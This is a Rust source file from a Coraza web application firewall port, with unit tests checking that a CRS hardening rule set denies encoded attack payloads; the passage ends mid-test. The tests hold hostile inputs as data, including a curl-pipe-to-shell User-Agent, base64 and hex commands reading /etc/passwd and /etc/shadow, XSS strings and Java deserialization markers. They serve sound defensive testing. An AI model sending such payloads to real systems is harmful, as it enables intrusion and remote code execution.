// Copyright Coraza Kubernetes Operator contributors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// This port is based on the original Coraza, created by Juan Pablo Tosso and
// the OWASP Coraza contributors.
//
// Copyright 2022 Juan Pablo Tosso and the OWASP Coraza contributors
// SPDX-License-Identifier: Apache-2.0

//! SecLang parsing helpers.

mod action_parser;
mod operator_parser;
mod parser;
mod rule_compiler;
mod variable_parser;

pub(crate) use action_parser::parse_actions;
pub use parser::{ParseError, Parser};

/// Go Coraza's recommended engine configuration, `coraza.conf-recommended`.
///
/// This is a verbatim copy of the file that the pinned Go Coraza release ships;
/// `cargo xtask go-fixtures-check` compares it with that release byte for byte. Load
/// it before a rule set such as the OWASP CRS, then set `SecRuleEngine On`: like
/// upstream, it starts in `DetectionOnly`.
///
/// Its rules turn the engine's error flags into blocks: 200002 (`REQBODY_ERROR`),
/// 200003 (`MULTIPART_STRICT_ERROR`), 200004 and 200005 (`ARGUMENTS_LIMIT_REACHED`)
/// and 200009 (`URI_PARSE_ERROR`); 200000, 200001 and 200006 select the XML and
/// JSON body processors. The CRS reads none of those flags, so without these rules a
/// body that could not be parsed is neither inspected nor blocked.
///
/// The file sets `SecRequestBodyInMemoryLimit` and `SecDataDir`, which need a
/// filesystem. The envoy-coraza filter ships a copy without them as
/// `@recommended-conf`.
pub const RECOMMENDED_CONF: &str = include_str!("../coraza.conf-recommended");

/// A supplement to the OWASP Core Rule Set (CRS) that closes gaps of its paranoia level 1.
///
/// Load it **after** the CRS rules, which it updates, and after [`RECOMMENDED_CONF`]:
///
/// ```text
/// RECOMMENDED_CONF, then SecRuleEngine On, then the CRS setup file, then the CRS rules,
/// then CRS_HARDENING_CONF
/// ```
///
/// It lets the CRS command, SQL, template, `NoSQL`, remote-file and LDAP rules of paranoia level 1
/// read request headers (by rule id, so rules that already read every header keep what they
/// read), and adds `deny` rules for Java gadget classes and serialized objects, for XSS in request
/// headers, for XSS and system files in base64 or hex wrapped values, for `GraphQL` introspection and for command
/// substitutions that print nothing, and a phase 1 copy of CRS rule 932235 over the `User-Agent` that
/// skips the strict shape of Composer's. The rules are original to this project, are not in Go
/// Coraza or the CRS, and block requests the CRS alone passes; the header comment of the file
/// lists them with their measured false positives. The `deny` rules also work without the CRS;
/// the retargeting does nothing then, the copy of 932235 has no anomaly score to add, and the PL3 rule 10932238, which
/// skips itself below level 3 by reading the CRS's `tx.blocking_paranoia_level`, stays off because that variable is
/// unset.
///
/// A `SecRuleUpdateTarget*` line that excludes a header from a rule must come **after** this
/// file to reach the header target it adds; see the header comment of the file.
pub const CRS_HARDENING_CONF: &str = include_str!("../crs-hardening.conf");

/// Error returned while compiling a SecLang value.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct CompileError {
    /// Human-readable explanation of the parse failure.
    pub(crate) message: String,
}

impl CompileError {
    /// Construct an error with its user-facing message.
    pub(crate) fn new(message: String) -> Self {
        Self { message }
    }
}

impl std::fmt::Display for CompileError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.write_str(&self.message)
    }
}

impl std::error::Error for CompileError {}

impl From<crate::actions::ActionError> for CompileError {
    fn from(error: crate::actions::ActionError) -> Self {
        Self::new(error.to_string())
    }
}

#[cfg(test)]
#[expect(
    clippy::unwrap_used,
    reason = "tests compile the shipped file and feed it fixed byte strings"
)]
mod tests {
    use base64::{
        Engine as _,
        engine::general_purpose::{STANDARD, URL_SAFE},
    };

    use super::{CRS_HARDENING_CONF, Parser};
    use crate::Waf;

    /// The rule that denies a Java serialization stream.
    const JAVA_SERIALIZED_OBJECT: i32 = 10_944_210;

    /// Compiles `CRS_HARDENING_CONF` alone, blocking, with multiphase evaluation `multiphase`.
    fn hardening_waf(multiphase: bool) -> Waf {
        let mut parser = Parser::new();
        parser.config_mut().multiphase_evaluation = multiphase;
        parser
            .from_string(&format!("SecRuleEngine On\n{CRS_HARDENING_CONF}"))
            .unwrap();
        parser.into_waf().unwrap()
    }

    /// Like [`hardening_waf`], after the rule that sets the CRS's blocking and detection paranoia levels.
    fn hardening_waf_at(blocking: u8, detection: u8) -> Waf {
        let mut parser = Parser::new();
        parser.config_mut().multiphase_evaluation = true;
        parser
            .from_string(&format!(
                "SecRuleEngine On\nSecAction \"id:900000,phase:1,pass,nolog,setvar:tx.blocking_paranoia_level={blocking},\
                 setvar:tx.detection_paranoia_level={detection}\"\n{CRS_HARDENING_CONF}"
            ))
            .unwrap();
        parser.into_waf().unwrap()
    }

    /// The id of the rule that denies a request whose argument `x` is `value`, if any.
    fn denied_by(waf: &Waf, value: &[u8]) -> Option<i32> {
        denied_by_argument(waf, "x", value)
    }

    /// The id of the rule that denies a request whose query argument `name` is `value`, if any.
    fn denied_by_argument(waf: &Waf, name: &str, value: &[u8]) -> Option<i32> {
        let mut transaction = waf.new_transaction();
        transaction.process_uri("/", "GET", "HTTP/1.1");
        transaction.add_get_argument(name, value);
        transaction.add_request_header("Host", "example.com");
        transaction.process_request_headers();
        transaction.process_request_body(b"");
        transaction.interruption().map(|interruption| interruption.rule_id)
    }

    /// The id of the rule that denies a request that carries `value` in the request header `name`, if any. A `Cookie`
    /// header is parsed into `REQUEST_COOKIES` as `data=<value>`.
    fn denied_by_header(waf: &Waf, name: &str, value: &[u8]) -> Option<i32> {
        let mut transaction = waf.new_transaction();
        transaction.process_uri("/", "GET", "HTTP/1.1");
        transaction.add_request_header("Host", "example.com");
        if name.eq_ignore_ascii_case("cookie") {
            transaction.add_request_header(name, [b"data=".as_slice(), value].concat());
        } else {
            transaction.add_request_header(name, value);
        }
        transaction.process_request_headers();
        transaction.process_request_body(b"");
        transaction.interruption().map(|interruption| interruption.rule_id)
    }

    /// The id of the rule that denies a request whose cookie `name` is `value`, if any.
    fn denied_by_cookie(waf: &Waf, name: &str, value: &str) -> Option<i32> {
        let mut transaction = waf.new_transaction();
        transaction.process_uri("/", "GET", "HTTP/1.1");
        transaction.add_request_header("Host", "example.com");
        transaction.add_request_header("Cookie", format!("{name}={value}"));
        transaction.process_request_headers();
        transaction.process_request_body(b"");
        transaction.interruption().map(|interruption| interruption.rule_id)
    }

    /// Standard base64 with padding.
    fn base64(bytes: &[u8]) -> Vec<u8> {
        STANDARD.encode(bytes).into_bytes()
    }

    /// Standard base64 wrapped at 76 columns with `line_break` after each line but the last, as GNU `base64`,
    /// Python's `encodebytes`, Java's MIME encoder and PHP's `chunk_split` write it.
    fn base64_wrapped(bytes: &[u8], line_break: &str) -> Vec<u8> {
        let encoded = STANDARD.encode(bytes);
        encoded
            .as_bytes()
            .chunks(76)
            .map(|line| String::from_utf8_lossy(line).into_owned())
            .collect::<Vec<_>>()
            .join(line_break)
            .into_bytes()
    }

    #[test]
    fn crs_hardening_conf_parses_alone_with_and_without_multiphase() {
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            assert_eq!(
                denied_by(&waf, b"hello world"),
                None,
                "a plain value passes (multiphase={multiphase})"
            );
            assert_eq!(
                denied_by(&waf, b"com.sun.rowset.JdbcRowSetImpl"),
                Some(10_944_130),
                "the gadget list denies without the CRS (multiphase={multiphase})"
            );
        }
    }

    #[test]
    fn the_java_serialization_rule_matches_every_alignment_and_following_byte() {
        const MAGIC: [u8; 4] = [0xAC, 0xED, 0x00, 0x05];
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            let stream = |prefix: &[u8], following: &[u8]| [prefix, &MAGIC, following].concat();
            let mut cases = Vec::new();
            for following in 0..=255_u8 {
                // Alignment 0: no prefix; 1: one prefix byte; 2: two.
                cases.push(stream(&[], &[following, 0x74]));
                cases.push(stream(&[], &[following]));
                for prefix in [0x00, 0x41, 0xFF] {
                    cases.push(stream(&[prefix], &[following, 0x74]));
                    cases.push(stream(&[0x41, prefix], &[following]));
                }
            }
            // The byte before the magic at alignments 1 and 2 changes one base64 character each.
            for prefix in 0..=255_u8 {
                cases.push(stream(&[prefix], &[0x73]));
                cases.push(stream(&[0x41, prefix], &[0x73]));
            }
            // At alignment 2 the character before `s7QAF` is `+` in the standard alphabet and `-` in the URL-safe one.
            for bytes in &cases {
                for (alphabet, encoded) in [
                    ("standard", STANDARD.encode(bytes)),
                    ("URL-safe", URL_SAFE.encode(bytes)),
                ] {
                    assert_eq!(
                        denied_by(&waf, encoded.as_bytes()),
                        Some(JAVA_SERIALIZED_OBJECT),
                        "{alphabet} base64 of {bytes:02x?} (multiphase={multiphase})"
                    );
                }
            }
        }
    }

    #[test]
    fn the_java_serialization_rule_matches_hex_and_raw_bytes() {
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for value in [
                &b"aced0005737200"[..],
                b"ACED0005737200",
                b"AcEd0005",
                b"x-aced0005-y",
                b"\xac\xed\x00\x05sr",
            ] {
                assert_eq!(
                    denied_by(&waf, value),
                    Some(JAVA_SERIALIZED_OBJECT),
                    "{value:?} (multiphase={multiphase})"
                );
            }
            // CRS 944210 matches `rO0ABQ`, which only a stream without a following byte encodes to.
            for value in [&b"rO0AB"[..], b"aced000", b"aced00x5", b"ACEd0006", b"\xac\xed\x00\x06"] {
                assert_eq!(
                    denied_by(&waf, value),
                    None,
                    "{value:?} is not a stream header (multiphase={multiphase})"
                );
            }
        }
    }
    /// The id of the rule that denies a POST with `content_type` and `body`, through a waf that selects the JSON
    /// processor.
    fn body_denied_by(waf: &Waf, content_type: &str, body: &[u8]) -> Option<i32> {
        let mut transaction = waf.new_transaction();
        transaction.process_uri("/graphql", "POST", "HTTP/1.1");
        transaction.add_request_header("Host", "example.com");
        transaction.add_request_header("Content-Type", content_type);
        transaction.add_request_header("Content-Length", body.len().to_string());
        transaction.process_request_headers();
        transaction.process_request_body(body);
        transaction.interruption().map(|interruption| interruption.rule_id)
    }

    /// A waf with the supplement and the rule that selects the JSON body processor.
    fn body_waf(multiphase: bool) -> Waf {
        let mut parser = Parser::new();
        parser.config_mut().multiphase_evaluation = multiphase;
        parser
            .from_string(&format!(
                "SecRuleEngine On\nSecRequestBodyAccess On\n\
                 SecRule REQUEST_HEADERS:Content-Type \"^application/json\" \"id:200001,phase:1,t:none,t:lowercase,pass,nolog,ctl:requestBodyProcessor=JSON\"\n\
                 {CRS_HARDENING_CONF}"
            ))
            .unwrap();
        parser.into_waf().unwrap()
    }

    #[test]
    fn graphql_introspection_is_denied_in_the_query_argument_and_in_a_graphql_body() {
        for multiphase in [false, true] {
            let waf = body_waf(multiphase);
            for (query, denied) in [
                (&b"{__schema{types{name}}}"[..], true),
                (b"query { __type(name: \"User\") { name } }", true),
                (b"{ a: __Schema { x } }", true),
                (b"{ viewer { id __typename } }", false),
                (b"{ products { __schemas_total } }", false),
            ] {
                assert_eq!(
                    denied_by_argument(&waf, "query", query),
                    denied.then_some(10_934_900),
                    "query={:?} (multiphase={multiphase})",
                    String::from_utf8_lossy(query)
                );
                assert_eq!(
                    denied_by_argument(&waf, "x", query),
                    None,
                    "only an argument named query is a GraphQL query (multiphase={multiphase})"
                );
                let mut json = br#"{"query":""#.to_vec();
                json.extend(query.iter().filter(|byte| **byte != b'"'));
                json.extend(br#""}"#);
                assert_eq!(
                    body_denied_by(&waf, "application/json", &json).is_some(),
                    denied,
                    "json {:?} (multiphase={multiphase})",
                    String::from_utf8_lossy(&json)
                );
                // A batch is a JSON array: the JSON processor names its fields `json.0.query`, `json.1.query`.
                for batch in [
                    [&b"["[..], &json, b"]"].concat(),
                    [&b"[{\"query\":\"{me{id}}\"},"[..], &json, b"]"].concat(),
                ] {
                    assert_eq!(
                        body_denied_by(&waf, "application/json", &batch).is_some(),
                        denied,
                        "batched json {:?} (multiphase={multiphase})",
                        String::from_utf8_lossy(&batch)
                    );
                }
                for content_type in ["application/graphql", "Application/GraphQL; charset=utf-8"] {
                    // The forced URL-encoded parse names the argument after the whole query when it holds no `=`;
                    // rule 10934901 reads the body.
                    assert_eq!(
                        body_denied_by(&waf, content_type, query).is_some(),
                        denied,
                        "{content_type} {:?} (multiphase={multiphase})",
                        String::from_utf8_lossy(query)
                    );
                }
            }
            assert_eq!(
                body_denied_by(&waf, "application/graphql", br#"{ a(x: "1=2") { __schema { x } } }"#),
                Some(10_934_901),
                "the body rule sees a query whose text after an `=` would be an argument value (multiphase={multiphase})"
            );
        }
    }

    #[test]
    fn a_key_or_field_named_type_or_schema_is_not_a_graphql_query() {
        for multiphase in [false, true] {
            let waf = body_waf(multiphase);
            // A query argument or a form field named `__type` or `__schema` carries a value, not a query.
            for name in ["__type", "__schema", "json.__type", "json.author.__type", "__Type"] {
                assert_eq!(
                    denied_by_argument(&waf, name, b"Order"),
                    None,
                    "argument {name} (multiphase={multiphase})"
                );
            }
            // Type hints of Parse Server (`Pointer`, `Date`, `File`), ASP.NET AJAX and WCF: JSON keys, at any depth.
            for body in [
                &br#"{"title":"Hello","author":{"__type":"Pointer","className":"_User","objectId":"8TOXdXf3tz"}}"#[..],
                br#"{"dueDate":{"__type":"Date","iso":"2024-11-24T12:00:00.000Z"}}"#,
                br#"{"picture":{"__type":"File","name":"pic.jpg","url":"https://files.example.com/pic.jpg"}}"#,
                br#"{"where":{"post":{"__type":"Pointer","className":"Post","objectId":"abc"}},"limit":10}"#,
                br#"{"d":null,"customer":{"__type":"Customer:#MyCompany.Models","Name":"Alice"}}"#,
                br#"{"__type":"Circle:#Shapes","radius":3}"#,
                br#"[{"__type":"A:#B"},{"__schema":"public"}]"#,
            ] {
                assert_eq!(
                    body_denied_by(&waf, "application/json", body),
                    None,
                    "{:?} (multiphase={multiphase})",
                    String::from_utf8_lossy(body)
                );
            }
            // The query argument and the `query` field of a JSON body, in a batch too, stay denied.
            assert_eq!(
                denied_by_argument(&waf, "query", b"{__type(name: \"User\") { name }}"),
                Some(10_934_900),
                "the query argument (multiphase={multiphase})"
            );
            assert!(
                body_denied_by(
                    &waf,
                    "application/json",
                    br#"{"__type":"A","query":"{__schema{types{name}}}"}"#
                )
                .is_some(),
                "a JSON body with both (multiphase={multiphase})"
            );
        }
    }

    #[test]
    fn wrapped_payloads_are_denied_after_a_decode_and_wrapped_sql_injection_is_the_known_gap() {
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            let text = |value: &str| value.as_bytes().to_vec();
            for (value, rule) in [
                (base64(b";cat /etc/passwd"), 10_930_120),
                (base64(b"x | /bin/sh -c id"), 10_930_120),
                (base64(b"<img src=x onerror=alert(1)>"), 10_941_100),
                (b"2f6574632f706173737764".to_vec(), 10_930_121),
                (b"2F6574632F736861646F77".to_vec(), 10_930_121),
                (text("x706f7765727368656c6c-y"), 10_930_121),
                (
                    text("3c696d67207372633d78206f6e6572726f723d616c6572742831293e"),
                    10_941_101,
                ),
            ] {
                assert_eq!(
                    denied_by(&waf, &value),
                    Some(rule),
                    "{:?} (multiphase={multiphase})",
                    String::from_utf8_lossy(&value)
                );
            }
            // A raw value that names a system file in hex-decodable text does not block, and neither does wrapped SQL
            // injection: rules 10942100 and 10942101 are off because they block random tokens.
            for value in [
                text("powershell tutorial"),
                text("/bin/sh is the default shell"),
                base64(b"1' OR '1'='1"),
                b"31272f4f52202731273d2731".to_vec(),
            ] {
                assert_eq!(
                    denied_by(&waf, &value),
                    None,
                    "{:?} (multiphase={multiphase})",
                    String::from_utf8_lossy(&value)
                );
            }
        }
    }

    /// `len` pseudo-random bytes (xorshift64) from `seed`: file content, which a decode rule cannot tell from an
    /// upload.
    fn random_bytes(seed: u64, len: usize) -> Vec<u8> {
        let mut state = seed.wrapping_mul(0x9E37_79B9_7F4A_7C15) | 1;
        (0..len)
            .map(|_| {
                state ^= state << 13;
                state ^= state >> 7;
                state ^= state << 17;
                u8::try_from((state >> 24) & 0xFF).unwrap()
            })
            .collect()
    }

    /// Lower-case hex.
    fn hex(bytes: &[u8]) -> Vec<u8> {
        bytes
            .iter()
            .flat_map(|byte| format!("{byte:02x}").into_bytes())
            .collect()
    }

    #[test]
    fn base64_and_hex_file_content_is_not_denied_as_a_wrapped_payload() {
        // Random bytes decode to something libinjection reads as an HTML tag more often the longer they are: 1 of 50
        // files of 2 KiB, 16 of 50 of 16 KiB and 44 of 50 of 64 KiB. D1 and D2 read only a value that is all base64 or
        // hex and short.
        for multiphase in [false, true] {
            let (waf, json_waf) = (hardening_waf(multiphase), body_waf(multiphase));
            for (size, files) in [(16 * 1024, 8), (64 * 1024, 6), (256 * 1024, 1)] {
                for seed in 0..files {
                    let raw = random_bytes(seed, size);
                    for (kind, value) in [
                        ("base64", base64(&raw)),
                        ("hex", hex(&raw)),
                        // `@rx` is multi-line, so a head anchored with `^` and `$` read each line of a wrapped value.
                        ("base64 wrapped at 76 columns with LF", base64_wrapped(&raw, "\n")),
                        ("base64 wrapped at 76 columns with CRLF", base64_wrapped(&raw, "\r\n")),
                    ] {
                        assert_eq!(
                            denied_by(&waf, &value),
                            None,
                            "{kind} of {size} random bytes, seed {seed} (multiphase={multiphase})"
                        );
                        let body = [br#"{"name":"photo.jpg","content":""#, value.as_slice(), br#""}"#].concat();
                        assert_eq!(
                            body_denied_by(&json_waf, "application/json", &body),
                            None,
                            "{kind} of {size} random bytes in a JSON field, seed {seed} (multiphase={multiphase})"
                        );
                    }
                }
            }
        }
    }

    #[test]
    fn a_command_in_the_user_agent_adds_a_score_only_when_the_crs_reads_it() {
        // Rule 10932235 adds the CRS's anomaly score for a command in the `User-Agent`; without the CRS there is no
        // score that a rule reads, so it must not deny, and must not break the request.
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for agent in [
                ";curl 203.0.113.9/s|sh",
                "Composer/2.8.2 (Linux; 6.8.0-49-generic; PHP 8.3.13; cURL 8.5.0)",
            ] {
                let mut transaction = waf.new_transaction();
                transaction.process_uri("/", "GET", "HTTP/1.1");
                transaction.add_request_header("Host", "example.com");
                transaction.add_request_header("User-Agent", agent);
                transaction.process_request_headers();
                transaction.process_request_body(b"");
                assert!(
                    transaction.interruption().is_none(),
                    "{agent:?} (multiphase={multiphase})"
                );
            }
        }
    }

    #[test]
    fn a_wrapped_xss_payload_with_trailing_white_space_or_junk_is_denied() {
        // A decoder (Python, Go, Java's MIME decoder, PHP) skips a trailing newline or space; so does `base64Decode`.
        // PHP and Python skip a byte outside the alphabet and read on: the chain accepts one such byte, then at most 64
        // more bytes, which `base64DecodeExt` reads past it.
        let encoded = base64(b"<img src=x onerror=alert(1)>");
        let long_tail = format!("!{}", "A".repeat(64));
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for tail in ["\n", "\r\n", " ", "\t\n", "!", ";x", "#", ".", "!!", long_tail.as_str()] {
                let value = [encoded.as_slice(), tail.as_bytes()].concat();
                assert_eq!(
                    denied_by(&waf, &value),
                    Some(10_941_100),
                    "base64 and {tail:?} (multiphase={multiphase})"
                );
            }
            // Not read, and listed in the residue: more than 64 bytes after the junk byte (the decoder would read a
            // long value that is not base64), white space and then more text, a percent escape that is none of `%2B`,
            // `%2F` and `%3D`, and a junk byte before the payload.
            let too_long = format!("!{}", "A".repeat(65));
            for tail in [too_long.as_str(), " x", "%00"] {
                let value = [encoded.as_slice(), tail.as_bytes()].concat();
                assert_eq!(
                    denied_by(&waf, &value),
                    None,
                    "base64 and {tail:?} (multiphase={multiphase})"
                );
            }
            assert_eq!(
                denied_by(&waf, &[b"!".as_slice(), encoded.as_slice()].concat()),
                None,
                "a junk byte before the payload (multiphase={multiphase})"
            );
        }
    }

    #[test]
    fn a_url_safe_base64_payload_with_an_early_dash_or_underscore_is_denied_except_in_a_cookie() {
        // `base64Decode` reads the standard alphabet and stops at the first `-` or `_`; `base64DecodeExt` reads both.
        // `\xfb\xef\xbe` encodes to `----` and `???` to `Pz8_`: the first dash or underscore is early, not last.
        // An argument and a header decode with the extended form. A cookie does not: an ASP.NET Core session cookie is
        // base64url (`CfDJ8...`), and decoded in full 6 of 2,500 of them read as a tag and locked their users out. The
        // README lists a payload in URL-safe base64 with an early dash in a cookie as residue.
        let payload = b"<img src=x onerror=alert(1)>";
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for prefix in [&b"\xfb\xef\xbe"[..], b"???", b">>>"] {
                let value = URL_SAFE.encode([prefix, payload].concat()).into_bytes();
                assert!(
                    value.iter().take(24).any(|byte| matches!(byte, b'-' | b'_')),
                    "the case has an early dash or underscore: {}",
                    String::from_utf8_lossy(&value)
                );
                for (place, rule) in [
                    (denied_by(&waf, &value), "query argument"),
                    (denied_by_header(&waf, "X-Custom-Data", &value), "header"),
                ] {
                    assert_eq!(
                        place,
                        Some(10_941_100),
                        "URL-safe base64 of {prefix:02x?} and a payload in a {rule} (multiphase={multiphase})"
                    );
                }
                assert_eq!(
                    denied_by_header(&waf, "Cookie", &value),
                    None,
                    "URL-safe base64 of {prefix:02x?} and a payload in a cookie (multiphase={multiphase})"
                );
            }
        }
    }

    #[test]
    fn a_standard_base64_payload_in_a_cookie_is_denied_by_the_cookie_rule() {
        // A cookie is read by rule 10941104, a copy of 10941100 that decodes with `base64Decode`: a payload that a
        // backend reads from a cookie is as likely as one in a header, and the junk tail is read the same way.
        let encoded = base64(b"<img src=x onerror=alert(1)>");
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for tail in ["", "!", "#", "."] {
                let value = [encoded.as_slice(), tail.as_bytes()].concat();
                assert_eq!(
                    denied_by_header(&waf, "Cookie", &value),
                    Some(10_941_104),
                    "base64 and {tail:?} in a cookie (multiphase={multiphase})"
                );
            }
        }
    }

    #[test]
    fn a_session_cookie_of_a_common_framework_is_not_denied() {
        // Random bytes in base64: Rails and Rack `data--iv--tag` and PHP `setcookie` percent-encode them (`%2B`, `%2F`,
        // `%3D`), ASP.NET Core Data Protection writes base64url after `CfDJ8`. Rule 10941103 once read the first two
        // (9 of 2,500 Rails and 3 of 2,500 PHP cookies denied) and `base64DecodeExt` the third (6 of 2,500), and a
        // session cookie that matches locks its user out. The values are from the review's corpus (seed 77).
        let cookies = [
            (
                "_app_session",
                "PktBBUcGbCA2jK3keBa%2F3DUaEoBJGpvLTBO9X86hDjwhbmG3SftkVfiIUvNssQGCjse1XZ2NauW21T%2BtRLwrx6ncMWsixw2UTX2JOSpDfVDcgoVrNfnQ%2F4vAqlEKD26Wmp6Dy6IGINDeoNnXEbJ%2FFJnqIgYo2RtxgHexK6u8mvbR--keD82%2FzLwihbhZc4--voPbITusK2bX6EJ9YGu0jA%3D%3D",
            ),
            (
                "_app_session",
                "cvccGKENoq%2BBUTT7ZiXAcmzguLSUZi%2BfuO%2Fu%2BmmQsbpq0QEGDVbCDy%2BPMiC%2FYRRYG0lekha2sTw8IbPWcUhrOzJI3sUyJ21LTDNMgSMzh1hJ6DU9J4nlDocfctTuiWBaL%2F%2BTGgwlqOM8cIaSrsyCjH0hqFBIBgVZag%3D%3D--ECIrxMHvGM4grB4m--zfTtD8yyOM51o1nWhwZG4A%3D%3D",
            ),
            (
                "remember",
                "hyn%2FJHKX3MpTzf4q25MlfSo8JUqQq5TU9bSKjxlGNPZ7k7pgbkbYgmg257Z917LZaWaGMe9QKSiyboUIEoj105Zz7JaFiObUYbh21%2BKFj4as5Sf0RUAANt%2FWYVKsy8wC4Z5H9HO9EBcPxbnXB32JTff0iSwdEQ%3D%3D",
            ),
            (
                ".AspNetCore.Session",
                "CfDJ8ctP0Xal4Tt7Kt06LPOABDWXKwkrf5ACziOPPCUWHCEevqI83-AzTzK1XXVL3jngqpuuYL9m0WYFov94fZ7hEgt07csQeoW4goRs-73w0gtdLmArrhkNlhVCeGvN2WQCkwel2NE238J_JCMAJXWGjkgYvreeMTYYn87ic-js3bXtpnUjH-sE",
            ),
        ];
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for (name, value) in cookies {
                assert_eq!(
                    denied_by_cookie(&waf, name, value),
                    None,
                    "the cookie {name} (multiphase={multiphase})"
                );
            }
        }
    }

    #[test]
    fn a_system_file_in_url_safe_base64_or_with_a_junk_byte_is_denied() {
        // Rule 10930120 decodes with `base64DecodeExt`, like the XSS child: a value in the URL-safe alphabet with an
        // early `-` or `_` (`base64Decode` stops there) and a value with a junk byte inside (PHP and Python skip it)
        // are read in an argument, a header and a cookie.
        let payload = b";cat /etc/passwd";
        let standard = base64(payload);
        let (head, tail) = standard.split_at(8);
        let junk = [head, b"!", tail].concat();
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            let mut values = vec![("a junk byte inside".to_owned(), junk.clone())];
            for prefix in [&b"\xfb\xef\xbe"[..], b"???"] {
                values.push((
                    format!("URL-safe base64 of {prefix:02x?} and the payload"),
                    URL_SAFE.encode([prefix, payload].concat()).into_bytes(),
                ));
            }
            for (kind, value) in values {
                for (rule, place) in [
                    (denied_by(&waf, &value), "query argument"),
                    (denied_by_header(&waf, "X-Custom-Data", &value), "header"),
                    (denied_by_header(&waf, "Cookie", &value), "cookie"),
                ] {
                    assert_eq!(rule, Some(10_930_120), "{kind} in a {place} (multiphase={multiphase})");
                }
            }
        }
    }

    #[test]
    fn a_percent_encoded_base64_payload_is_denied_in_an_argument_and_not_read_in_a_cookie_or_header() {
        // The engine decodes an argument once; a client that URL-encodes the value twice leaves `%2B`, `%2F` and `%3D`
        // for the backend to decode, and then the base64. Rule 10941103 reads arguments only: Rails and PHP
        // percent-encode base64 session cookies, and the rule locked 0.1 to 0.4 percent of those sessions out while it
        // caught no payload of the X2 matrix in a cookie or a header. The README lists both as residue.
        let payload = b"<img src=x onerror=alert(1)>";
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for prefix in [&b">>>"[..], b"???", b"\xfb\xef\xbe"] {
                for (alphabet, encoded) in [
                    ("standard", STANDARD.encode([prefix, payload].concat())),
                    ("URL-safe", URL_SAFE.encode([prefix, payload].concat())),
                ] {
                    let value = encoded.replace('+', "%2B").replace('/', "%2F").replace('=', "%3D");
                    let lower = value.replace("%2B", "%2b").replace("%2F", "%2f").replace("%3D", "%3d");
                    for text in [value.as_str(), lower.as_str()] {
                        assert_eq!(
                            denied_by(&waf, text.as_bytes()),
                            Some(10_941_103),
                            "{alphabet} base64 of {prefix:02x?}, percent-encoded: {text} in an argument (multiphase={multiphase})"
                        );
                        for place in ["Cookie", "X-Custom-Data"] {
                            assert_eq!(
                                denied_by_header(&waf, place, text.as_bytes()),
                                None,
                                "{alphabet} base64 of {prefix:02x?}, percent-encoded: {text} in {place} (multiphase={multiphase})"
                            );
                        }
                    }
                }
            }
            // Not read, and listed in the residue: a percent escape other than `%2B`, `%2F` and `%3D`, and a literal
            // `+`.
            let encoded = STANDARD.encode([b">>>".as_slice(), payload].concat());
            for value in [
                format!("{}%20{}", encoded.get(..12).unwrap(), encoded.get(12..).unwrap()),
                encoded.replace('=', "%3D"),
            ] {
                assert!(
                    value.contains('+') || value.contains("%20"),
                    "the case holds a literal plus or an escape: {value}"
                );
                assert_eq!(
                    denied_by(&waf, value.as_bytes()),
                    None,
                    "{value} (multiphase={multiphase})"
                );
            }
            // Ordinary percent-encoded values are not read as base64: a URL path, a redirect target.
            for value in [
                "%2Fdashboard%2Forders%2F42",
                "%2Fapi%2Fv1%2Fusers",
                "a%2Fb",
                "return%3Dhome",
            ] {
                for rule in [
                    denied_by(&waf, value.as_bytes()),
                    denied_by_header(&waf, "Cookie", value.as_bytes()),
                ] {
                    assert_eq!(rule, None, "{value} (multiphase={multiphase})");
                }
            }
        }
    }

    #[test]
    fn a_line_wrapped_xss_payload_is_denied_while_the_line_breaks_count_toward_the_cap() {
        // A MIME encoder wraps at 76 columns. The head of the chain counts a line break as one character of the cap, so
        // a wrapped value is read up to 256 characters in all, and a wrapped value of random file content is not (the
        // test of file content). 150 bytes are 200 characters in 3 lines; 190 bytes are 256 characters and 3 line
        // breaks.
        let padded = |len: usize| {
            let mut payload = b"<img src=x onerror=alert(1)>".to_vec();
            payload.resize(len, b' ');
            payload
        };
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for (bytes, line_break, rule) in [
                (150, "\n", Some(10_941_100)),
                (150, "\r\n", Some(10_941_100)),
                (189, "\n", Some(10_941_100)),
                (192, "\n", None),
                (192, "\r\n", None),
                (300, "\r\n", None),
            ] {
                let value = base64_wrapped(&padded(bytes), line_break);
                assert_eq!(
                    denied_by(&waf, &value),
                    rule,
                    "{bytes} bytes wrapped at 76 columns with {line_break:?}, {} characters (multiphase={multiphase})",
                    value.len()
                );
            }
        }
    }

    #[test]
    fn a_wrapped_xss_payload_is_denied_up_to_the_length_the_decode_rules_read() {
        // `base64Decode` and `hexDecode` run on a value that is entirely base64 (8 to 256 characters) or hex (8 to
        // 512 characters). A longer wrapped payload passes: the README lists it.
        let padded = |len: usize| {
            let mut payload = b"<img src=x onerror=alert(1)>".to_vec();
            payload.resize(len, b' ');
            payload
        };
        for multiphase in [false, true] {
            let waf = hardening_waf(multiphase);
            for (bytes, base64_rule, hex_rule) in [
                (28, Some(10_941_100), Some(10_941_101)),
                (192, Some(10_941_100), Some(10_941_101)),
                (193, None, Some(10_941_101)),
                (256, None, Some(10_941_101)),
                (257, None, None),
            ] {
                let payload = padded(bytes);
                for (kind, value, rule) in [
                    ("base64", base64(&payload), base64_rule),
                    ("URL-safe base64", URL_SAFE.encode(&payload).into_bytes(), base64_rule),
                    ("hex", hex(&payload), hex_rule),
                ] {
                    assert_eq!(
                        denied_by(&waf, &value),
                        rule,
                        "{kind} of {bytes} bytes, {} characters (multiphase={multiphase})",
                        value.len()
                    );
